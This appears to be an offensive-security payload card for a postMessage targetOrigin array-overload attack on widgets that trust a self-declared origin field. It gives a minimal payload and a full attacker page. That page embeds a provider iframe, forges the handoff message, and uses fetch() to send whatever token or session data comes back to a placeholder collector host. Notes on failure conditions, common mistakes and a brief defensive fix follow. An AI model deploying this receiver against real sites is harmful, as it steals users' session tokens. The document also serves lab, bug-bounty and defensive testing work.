# postMessage targetOrigin Array Overload Payload

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a provider widget hands off a token or session via `postMessage`
- the widget trusts `event.data.origin` or a similar attacker-controlled field
- the widget validates with `new URL(origin)`, `.hostname`, or other string-based checks
- the same `origin` value is reused as the second argument to `window.postMessage`
- the code does not freeze the value to a primitive string before reuse

## Minimal Payload

Use an array that stringifies to a trusted URL but also carries `targetOrigin`:

```javascript
const a = ['https://trusted.example'];
a.targetOrigin = location.origin;

popup.postMessage(
  { origin: a },
  '*'
);
```

## Receiver Example

```javascript
window.addEventListener('message', function(e) {
  fetch('https://[collector]?d=' + encodeURIComponent(
    'origin=' + e.origin + ' data=' + String(e.data)
  ));
});

var frame = document.createElement('iframe');
frame.src = 'https://[provider]/embed/handoff';
document.body.appendChild(frame);

setTimeout(function() {
  const a = ['https://trusted.example'];
  a.targetOrigin = location.origin;
  try {
    frame.contentWindow.postMessage({ origin: a }, '*');
  } catch (e) {}
}, 1500);
```

## Why It Works

The widget should trust `event.origin`, but instead trusts a self-declared origin-like value inside `event.data`. If it validates with `new URL(origin)` and later reuses the same value in `postMessage(..., origin)`, the attacker can exploit the mismatch between string coercion and overload semantics.

## Why It Fails

- The widget validates `event.origin`
- The widget requires a primitive string before parsing
- The code uses a normalized parsed origin string at the sink
- The review flow never opens attacker-controlled external origins
- Third-party cookie restrictions make the embedded context insufficient for the targeted secret

## Common Mistakes

- Treating this as normal URL parser confusion and testing only strings
- Forgetting to set `targetOrigin` on the array/object value
- Sending the forged message only once before the receiver listener is installed
- Assuming local iframe success implies real secret disclosure
- Storing live flags, collector URLs, or tokens in reusable payload files

## Defensive Note

If an origin-like value comes from attacker input, convert it to a validated primitive string once and discard the original object. Never pass attacker-controlled objects into overload-sensitive browser APIs.
